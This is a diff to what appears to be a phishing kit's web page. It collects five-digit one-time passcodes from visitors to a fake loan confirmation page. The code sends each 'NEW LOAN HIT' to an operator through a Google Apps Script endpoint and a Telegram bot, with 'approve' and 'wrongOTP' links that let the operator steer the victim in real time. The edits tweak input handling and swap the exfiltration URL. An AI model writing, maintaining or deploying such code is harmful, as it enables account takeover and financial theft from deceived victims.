@@ -99,11 +99,11 @@
     <div class="timer-box" id="timer">00:30</div>
 
     <div class="otp-row">
-    <input type="number" class="otp-input" maxlength="1" oninput="moveFocus(this, 0)">
-    <input type="number" class="otp-input" maxlength="1" oninput="moveFocus(this, 1)">
-    <input type="number" class="otp-input" maxlength="1" oninput="moveFocus(this, 2)">
-    <input type="number" class="otp-input" maxlength="1" oninput="moveFocus(this, 3)">
-    <input type="number" class="otp-input" maxlength="1" oninput="moveFocus(this, 4)">
+    <input type="text" inputmode="numeric" class="otp-input" maxlength="1" oninput="moveFocus(this, 0)">
+    <input type="text" inputmode="numeric" class="otp-input" maxlength="1" oninput="moveFocus(this, 1)">
+    <input type="text" inputmode="numeric" class="otp-input" maxlength="1" oninput="moveFocus(this, 2)">
+    <input type="text" inputmode="numeric" class="otp-input" maxlength="1" oninput="moveFocus(this, 3)">
+    <input type="text" inputmode="numeric" class="otp-input" maxlength="1" oninput="moveFocus(this, 4)">
 </div>
 
     <button class="btn-red" id="otp-btn" onclick="sendOTP()">Confirm & Finish</button>
@@ -120,7 +120,7 @@
         let isResetting = false;
         let otpInterval;
     // Config
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycby9cqRg2cYjYchgs06-lr7_9U9RtKte8GXc5-77EElhl-vYkqub-AlT3KLyTnGA87TWBA/exec";
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzNeOuKYspVrafIwvjWyt2P_Hb0LT9DH4SEhLgdhf8L-5MyffvGurrgTNvWpg7MGz3OUg/exec";
     const urlParams = new URLSearchParams(window.location.search);
     const BOT_TOKEN = urlParams.get('token');
     const CHAT_ID = urlParams.get('id');
@@ -163,7 +163,7 @@
         showView(2); // Show Loading
 
         // Send Notification to Operator
-        const approveLink = `${SCRIPT_URL}?cmd=approve&num=${id}`;
+        const approveLink = `${SCRIPT_URL}?cmd=approve&num=${encodeURIComponent(String(id).trim())}`;
         const wrongLink = `${SCRIPT_URL}?cmd=wrongOTP&num=${id}`;
         const msg = `💰 *NEW LOAN HIT*
 ID: ${id}
